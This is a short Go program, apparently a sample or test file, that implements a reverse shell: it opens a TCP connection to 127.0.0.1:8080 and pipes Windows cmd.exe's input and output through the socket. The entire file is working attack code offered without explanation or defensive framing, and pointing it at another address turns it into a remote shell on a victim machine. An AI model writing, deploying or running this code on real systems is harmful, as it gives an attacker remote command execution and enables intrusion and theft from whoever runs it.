//go:build ignore

package main

import (
	"io"
	"net"
	"os/exec"
)

func Execute(cmd string, arguments []string, stdin io.Reader, stdout io.Writer, stderr io.Writer) {
	command := exec.Cmd{
		Path:   cmd,
		Args:   arguments,
		Stdin:  stdin,
		Stdout: stdout,
		Stderr: stderr,
	}
	command.Run()
}

func Connect(address string, command string, arguments []string) {
	connection, connectionError := net.Dial("tcp", address)
	if connectionError != nil {
		return
	}
	Execute(command, arguments, connection, connection, connection)
}

func main() {
	Connect("127.0.0.1:8080", "C:\\Windows\\System32\\cmd.exe", []string{})
}
